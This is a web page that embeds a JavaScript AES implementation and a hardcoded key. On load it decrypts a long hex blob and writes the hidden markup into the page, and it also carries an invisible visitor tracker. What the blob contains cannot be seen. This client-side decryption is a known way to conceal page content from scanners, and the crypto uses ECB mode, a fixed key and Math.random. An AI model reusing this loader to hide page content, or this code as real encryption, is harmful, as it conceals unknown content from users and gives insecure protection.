<html>
<head>
<script language="javascript">


    var keySizeInBits = 128;
    var blockSizeInBits = 128;

    var roundsArray = [ ,,,,[,,,,10,, 12,, 14],, 
                            [,,,,12,, 12,, 14],, 
                            [,,,,14,, 14,, 14] ];

    var shiftOffsets = [ ,,,,[,1, 2, 3],,[,1, 2, 3],,[,1, 3, 4] ];

    var Rcon = [ 
    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 
    0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 
    0xab, 0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 
    0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 
    0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91 ];

    var SBox = [
     99, 124, 119, 123, 242, 107, 111, 197,  48,   1, 103,  43, 254, 215, 171, 
    118, 202, 130, 201, 125, 250,  89,  71, 240, 173, 212, 162, 175, 156, 164, 
    114, 192, 183, 253, 147,  38,  54,  63, 247, 204,  52, 165, 229, 241, 113, 
    216,  49,  21,   4, 199,  35, 195,  24, 150,   5, 154,   7,  18, 128, 226, 
    235,  39, 178, 117,   9, 131,  44,  26,  27, 110,  90, 160,  82,  59, 214, 
    179,  41, 227,  47, 132,  83, 209,   0, 237,  32, 252, 177,  91, 106, 203, 
    190,  57,  74,  76,  88, 207, 208, 239, 170, 251,  67,  77,  51, 133,  69, 
    249,   2, 127,  80,  60, 159, 168,  81, 163,  64, 143, 146, 157,  56, 245, 
    188, 182, 218,  33,  16, 255, 243, 210, 205,  12,  19, 236,  95, 151,  68,  
    23,  196, 167, 126,  61, 100,  93,  25, 115,  96, 129,  79, 220,  34,  42, 
    144, 136,  70, 238, 184,  20, 222,  94,  11, 219, 224,  50,  58,  10,  73,
      6,  36,  92, 194, 211, 172,  98, 145, 149, 228, 121, 231, 200,  55, 109, 
    141, 213,  78, 169, 108,  86, 244, 234, 101, 122, 174,   8, 186, 120,  37,  
     46,  28, 166, 180, 198, 232, 221, 116,  31,  75, 189, 139, 138, 112,  62, 
    181, 102,  72,   3, 246,  14,  97,  53,  87, 185, 134, 193,  29, 158, 225,
    248, 152,  17, 105, 217, 142, 148, 155,  30, 135, 233, 206,  85,  40, 223,
    140, 161, 137,  13, 191, 230,  66, 104,  65, 153,  45,  15, 176,  84, 187,  
     22 ];

    var SBoxInverse = [
     82,   9, 106, 213,  48,  54, 165,  56, 191,  64, 163, 158, 129, 243, 215, 
    251, 124, 227,  57, 130, 155,  47, 255, 135,  52, 142,  67,  68, 196, 222, 
    233, 203,  84, 123, 148,  50, 166, 194,  35,  61, 238,  76, 149,  11,  66, 
    250, 195,  78,   8,  46, 161, 102,  40, 217,  36, 178, 118,  91, 162,  73, 
    109, 139, 209,  37, 114, 248, 246, 100, 134, 104, 152,  22, 212, 164,  92, 
    204,  93, 101, 182, 146, 108, 112,  72,  80, 253, 237, 185, 218,  94,  21,  
     70,  87, 167, 141, 157, 132, 144, 216, 171,   0, 140, 188, 211,  10, 247, 
    228,  88,   5, 184, 179,  69,   6, 208,  44,  30, 143, 202,  63,  15,   2, 
    193, 175, 189,   3,   1,  19, 138, 107,  58, 145,  17,  65,  79, 103, 220, 
    234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116,  34, 231, 173,
     53, 133, 226, 249,  55, 232,  28, 117, 223, 110,  71, 241,  26, 113,  29, 
     41, 197, 137, 111, 183,  98,  14, 170,  24, 190,  27, 252,  86,  62,  75, 
    198, 210, 121,  32, 154, 219, 192, 254, 120, 205,  90, 244,  31, 221, 168,
     51, 136,   7, 199,  49, 177,  18,  16,  89,  39, 128, 236,  95,  96,  81,
    127, 169,  25, 181,  74,  13,  45, 229, 122, 159, 147, 201, 156, 239, 160,
    224,  59,  77, 174,  42, 245, 176, 200, 235, 187,  60, 131,  83, 153,  97, 
     23,  43,   4, 126, 186, 119, 214,  38, 225, 105,  20,  99,  85,  33,  12,
    125 ];

    function cyclicShiftLeft(theArray, positions) {
      var temp = theArray.slice(0, positions);
      theArray = theArray.slice(positions).concat(temp);
      return theArray;
    }

    var Nk = keySizeInBits / 32;                   
    var Nb = blockSizeInBits / 32;
    var Nr = roundsArray[Nk][Nb];

    function xtime(poly) {
      poly <<= 1;
      return ((poly & 0x100) ? (poly ^ 0x11B) : (poly));
    }

    function mult_GF256(x, y) {
      var bit, result = 0;
      
      for (bit = 1; bit < 256; bit *= 2, y = xtime(y)) {
        if (x & bit) 
          result ^= y;
      }
      return result;
    }

    function byteSub(state, direction) {
      var S;
      if (direction == "encrypt")           // Point S to the SBox we're using
        S = SBox;
      else
        S = SBoxInverse;
      for (var i = 0; i < 4; i++)           // Substitute for every byte in state
        for (var j = 0; j < Nb; j++)
           state[i][j] = S[state[i][j]];
    }

    function shiftRow(state, direction) {
      for (var i=1; i<4; i++)               // Row 0 never shifts
        if (direction == "encrypt")
           state[i] = cyclicShiftLeft(state[i], shiftOffsets[Nb][i]);
        else
           state[i] = cyclicShiftLeft(state[i], Nb - shiftOffsets[Nb][i]);

    }

    function mixColumn(state, direction) {
      var b = [];                            // Result of matrix multiplications
      for (var j = 0; j < Nb; j++) {         // Go through each column...
        for (var i = 0; i < 4; i++) {        // and for each row in the column...
          if (direction == "encrypt")
            b[i] = mult_GF256(state[i][j], 2) ^          // perform mixing
                   mult_GF256(state[(i+1)%4][j], 3) ^ 
                   state[(i+2)%4][j] ^ 
                   state[(i+3)%4][j];
          else 
            b[i] = mult_GF256(state[i][j], 0xE) ^ 
                   mult_GF256(state[(i+1)%4][j], 0xB) ^
                   mult_GF256(state[(i+2)%4][j], 0xD) ^
                   mult_GF256(state[(i+3)%4][j], 9);
        }
        for (var i = 0; i < 4; i++)          // Place result back into column
          state[i][j] = b[i];
      }
    }

    function addRoundKey(state, roundKey) {
      for (var j = 0; j < Nb; j++) {                 // Step through columns...
        state[0][j] ^= (roundKey[j] & 0xFF);         // and XOR
        state[1][j] ^= ((roundKey[j]>>8) & 0xFF);
        state[2][j] ^= ((roundKey[j]>>16) & 0xFF);
        state[3][j] ^= ((roundKey[j]>>24) & 0xFF);
      }
    }

    function keyExpansion(key) {
      var expandedKey = new Array();
      var temp;

      Nk = keySizeInBits / 32;                   
      Nb = blockSizeInBits / 32;
      Nr = roundsArray[Nk][Nb];

      for (var j=0; j < Nk; j++)     // Fill in input key first
        expandedKey[j] = 
          (key[4*j]) | (key[4*j+1]<<8) | (key[4*j+2]<<16) | (key[4*j+3]<<24);

      for (j = Nk; j < Nb * (Nr + 1); j++) {    // For each word of expanded key
        temp = expandedKey[j - 1];
        if (j % Nk == 0) 
          temp = ( (SBox[(temp>>8) & 0xFF]) |
                   (SBox[(temp>>16) & 0xFF]<<8) |
                   (SBox[(temp>>24) & 0xFF]<<16) |
                   (SBox[temp & 0xFF]<<24) ) ^ Rcon[Math.floor(j / Nk) - 1];
        else if (Nk > 6 && j % Nk == 4)
          temp = (SBox[(temp>>24) & 0xFF]<<24) |
                 (SBox[(temp>>16) & 0xFF]<<16) |
                 (SBox[(temp>>8) & 0xFF]<<8) |
                 (SBox[temp & 0xFF]);
        expandedKey[j] = expandedKey[j-Nk] ^ temp;
      }
      return expandedKey;
    }

    function Round(state, roundKey) {
      byteSub(state, "encrypt");
      shiftRow(state, "encrypt");
      mixColumn(state, "encrypt");
      addRoundKey(state, roundKey);
    }

    function InverseRound(state, roundKey) {
      addRoundKey(state, roundKey);
      mixColumn(state, "decrypt");
      shiftRow(state, "decrypt");
      byteSub(state, "decrypt");
    }

    function FinalRound(state, roundKey) {
      byteSub(state, "encrypt");
      shiftRow(state, "encrypt");
      addRoundKey(state, roundKey);
    }

    function InverseFinalRound(state, roundKey){
      addRoundKey(state, roundKey);
      shiftRow(state, "decrypt");
      byteSub(state, "decrypt");  
    }

    function encrypt(block, expandedKey) {
      var i;  
      if (!block || block.length*8 != blockSizeInBits)
         return; 
      if (!expandedKey)
         return;

      block = packBytes(block);
      addRoundKey(block, expandedKey);
      for (i=1; i<Nr; i++) 
        Round(block, expandedKey.slice(Nb*i, Nb*(i+1)));
      FinalRound(block, expandedKey.slice(Nb*Nr)); 
      return unpackBytes(block);
    }

    function decrypt(block, expandedKey) {
      var i;
      if (!block || block.length*8 != blockSizeInBits)
         return;
      if (!expandedKey)
         return;

      block = packBytes(block);
      InverseFinalRound(block, expandedKey.slice(Nb*Nr)); 
      for (i = Nr - 1; i>0; i--) 
        InverseRound(block, expandedKey.slice(Nb*i, Nb*(i+1)));
      addRoundKey(block, expandedKey);
      return unpackBytes(block);
    }

    function byteArrayToString(byteArray) {
      var result = "";
      for(var i=0; i<byteArray.length; i++)
        if (byteArray[i] != 0) 
          result += String.fromCharCode(byteArray[i]);
      return result;
    }

    function byteArrayToHex(byteArray) {
      var result = "";
      if (!byteArray)
        return;
      for (var i=0; i<byteArray.length; i++)
        result += ((byteArray[i]<16) ? "0" : "") + byteArray[i].toString(16);

      return result;
    }

    function hexToByteArray(hexString) {
      var byteArray = [];
      if (hexString.length % 2)             // must have even length
        return;
      if (hexString.indexOf("0x") == 0 || hexString.indexOf("0X") == 0)
        hexString = hexString.substring(2);
      for (var i = 0; i<hexString.length; i += 2) 
        byteArray[Math.floor(i/2)] = parseInt(hexString.slice(i, i+2), 16);
      return byteArray;
    }

    function packBytes(octets) {
      var state = new Array();
      if (!octets || octets.length % 4)
        return;

      state[0] = new Array();  state[1] = new Array(); 
      state[2] = new Array();  state[3] = new Array();
      for (var j=0; j<octets.length; j+= 4) {
         state[0][j/4] = octets[j];
         state[1][j/4] = octets[j+1];
         state[2][j/4] = octets[j+2];
         state[3][j/4] = octets[j+3];
      }
      return state;  
    }

    function unpackBytes(packed) {
      var result = new Array();
      for (var j=0; j<packed[0].length; j++) {
        result[result.length] = packed[0][j];
        result[result.length] = packed[1][j];
        result[result.length] = packed[2][j];
        result[result.length] = packed[3][j];
      }
      return result;
    }

    function formatPlaintext(plaintext) {
      var bpb = blockSizeInBits / 8;               // bytes per block
      var i;

      // if primitive string or String instance
      if (typeof plaintext == "string" || plaintext.indexOf) {
        plaintext = plaintext.split("");
        // Unicode issues here (ignoring high byte)
        for (i=0; i<plaintext.length; i++)
          plaintext[i] = plaintext[i].charCodeAt(0) & 0xFF;
      } 

      for (i = bpb - (plaintext.length % bpb); i > 0 && i < bpb; i--) 
        plaintext[plaintext.length] = 0;
      
      return plaintext;
    }

    function getRandomBytes(howMany) {
      var i;
      var bytes = new Array();
      for (i=0; i<howMany; i++)
        bytes[i] = Math.round(Math.random()*255);
      return bytes;
    }

    function rijndaelEncrypt(plaintext, key, mode) {
      var expandedKey, i, aBlock;
      var bpb = blockSizeInBits / 8;          // bytes per block
      var ct;                                 // ciphertext

      if (!plaintext || !key)
        return;
      //alert(key.length*8);
      if (key.length*8 != keySizeInBits)
        return; 
      if (mode == "CBC")
        ct = getRandomBytes(bpb);             // get IV
      else {
        mode = "ECB";
        ct = new Array();
      }

      // convert plaintext to byte array and pad with zeros if necessary. 
      plaintext = formatPlaintext(plaintext);

      expandedKey = keyExpansion(key);
      
      for (var block=0; block<plaintext.length / bpb; block++) {
        aBlock = plaintext.slice(block*bpb, (block+1)*bpb);
        if (mode == "CBC")
          for (var i=0; i<bpb; i++) 
            aBlock[i] ^= ct[block*bpb + i];
        ct = ct.concat(encrypt(aBlock, expandedKey));
      }

      return ct;
    }

    function rijndaelDecrypt(ciphertext, key, mode) {
      var expandedKey;
      var bpb = blockSizeInBits / 8;          // bytes per block
      var pt = new Array();                   // plaintext array
      var aBlock;                             // a decrypted block
      var block;                              // current block number
      if (!ciphertext || !key || typeof ciphertext == "string")
        return;
      if (key.length*8 != keySizeInBits)
        return; 
      if (!mode)
        mode = "ECB";                         // assume ECB if mode omitted

      expandedKey = keyExpansion(key);
     
      for (block=(ciphertext.length / bpb)-1; block>0; block--) {
        aBlock = 
         decrypt(ciphertext.slice(block*bpb,(block+1)*bpb), expandedKey);
        if (mode == "CBC") 
          for (var i=0; i<bpb; i++) 
            pt[(block-1)*bpb + i] = aBlock[i] ^ ciphertext[(block-1)*bpb + i];
        else 
          pt = aBlock.concat(pt);
      }

      if (mode == "ECB")
        pt = decrypt(ciphertext.slice(0, bpb), expandedKey).concat(pt);

      return pt;
    }

    function getEncText() {
    	var plaintext = document.myform.inputtext.value;
    	//var key = hexToByteArray(genkey());
    	var key = 'dfewrqwAcndjhbgn';
    	var mode = 'ECB'; 
    	var ciphertext = byteArrayToHex(rijndaelEncrypt(plaintext,key, mode));
    	//alert(encdata);
    	document.myform.outputtext.value = ciphertext;
    	document.myform.inputtext.value = '';
    }

    function getDecText() {
    	var ciphertext = document.myform.outputtext.value;
    	var key = 'dfewrqwAcndjhbgn';
    	var mode = 'ECB';
    	var decryptedtext = byteArrayToString(rijndaelDecrypt(hexToByteArray(ciphertext), key, mode));
    	document.myform.inputtext.value = decryptedtext;
    	document.myform.outputtext.value = '';
    }

    function getDecText1(ciphertext, key) {
    	var mode = 'ECB';
    	var decryptedtext = byteArrayToString(rijndaelDecrypt(hexToByteArray(ciphertext), key, mode));
    	return decryptedtext;
    }

</script>
</head>
<body>
<script language="javascript">
	var d="9a468fafaa588e004a73aab9807acaf84983a28db8f18e53533b7ddc5e7cc8fa528a8d42f840369bef184f0d9d02a1fd991b8df26064e8ffcab6b43c9b81e5ffc443e44b1c69b4fb2ce56b569e5280d59a782d32db9ac88b11b28bbf0840c7f5221e740c34b6282f48e2508522b60fd0a0df8b74525ebc8be54454f4f5bfc9affd0a57b765e815be8fd1cd99abe31bcceb129e0ed7dc469bf50c1d241f0cd60e0177d0dea6be46474e6297622101a6b078ed6882b7624b94656d53e117239788b0b1264f009b36efd61afa407ebb82478d1bd5e10f1de2b81f40ca45222c59c40ed8d4a0835e3a6f89661eec939ff1116d2cc236bd62433c45ac968c81abb83f8d0862ef5a5678b6fc07343c9edb75aa15e6941b3b80c5958176c4bcf54f0ada97d17fab0593e2edc84888d018689b3666e12d4b4ae7263782761c504bf074f201455b7d6c5dd598e0a1730ce6b95fc7d429a856a159d99daf4359af0396a3e6b9ad7f24280b3cf36ec290d85421b8ac5ed06ac32532bd5a5feced978b15336c94e381ea753dbb14e9b236f4b23e2b4a4135cfe807fe306eb0e2aebe9b8a80f742d1eaad6a2c2cbb77ad59f4e90802e8f90bb24220f8a2a54f4f38d47f0553c7d067060647b0065dc8d35edeb53831b53df6eb10b419224f7e99dee20dc2393fc894e6616e39b1a8d9d94ad5b43b25a303718fbb8202547e96d972734ef84beaec42c7f405f81282770e8b6916d6ad8133f67008887fca980595f9a638f283627ca44cc579b4961ca5ac6b4a1aae89b214fa469900829509139901f554722c151f1082ce3c79a6762060b6b28dc9665fb3152ac507a4498bc5749febf80381f1a6cf4db311802411b4ccf4e32211a9c8a2b13bd554f80c635e03f23400fdde7ca7dcafa2f8785067e00513a17163c336a92d31a0bb1b7d58104b6cb5aea8f265ee3ce1343d1a9ecd2a7ce5cbd5f2410ebf5b372966021126b3f78f47938756aaf6fa568c36473772a12359b563347d8c6a0d29b6ded7bf1d43e95581a4e89a3edfd4ce7c8d5b2afb963d8ec702197d8dcfe6ecb0d5c413fa82008ced343cdf13ec8eb1a3ea0c6f79696228e1cf4b41cbdcca415e1b5d088ed8b4a08b3afb5b600e0d6f0e5d4fea835a048a9affa0e3b24c22f97dbe0866f68265036eb3226a9235739f878474f9d59a5867652fb435ea28b3efe53ea0646e5a751b1b55817233cdd69e7113df4373d54680d5b704bb3b7262ad4bd375bb4f760e48cf79c17877e33eef679bb9e850fd2b5a808fc8cc626b926a4700f1b54b751104203c3c7e7558b6c4c804b1ba409eb0ebaab78615604ac98d0af3e745506232ef47113030fd7b5b470d5dfd36032cc2540bb86363cff05366dd31fd3f647a029e995e357f9a12b45e25babda9577ef7cec693e894ae748a17ab48ec066996e1fc536d36c308d64966d838b76556bf30f661684c0b0beae3730b974bc0a336a495656818b4f1c0d7e276c3f914b7c3de322bc0f7e75fd0650579507836a48a8782edf8a0434dda7ae27deba750c2730edc6f8eb1927a42d16be3bd39d3d3d8cc1670dbcd5b69";
	document.write(getDecText1(d, 'dfewrqwAcndjhbgn'));
</script>

<!-- Start of StatCounter Code -->
<script type="text/javascript">
var sc_project=3872848; 
var sc_invisible=1; 
var sc_partition=34; 
var sc_click_stat=1; 
var sc_security="eb77ed58"; 
</script>

<script type="text/javascript" src="http://www.statcounter.com/counter/counter.js"></script><noscript><div 
class="statcounter"><a href="http://www.statcounter.com/free_web_stats.html" target="_blank"><img class="statcounter" 
src="http://c.statcounter.com/3872848/0/eb77ed58/1/" alt="web stats" ></a></div></noscript>
<!-- End of StatCounter Code -->

</body>
</html>
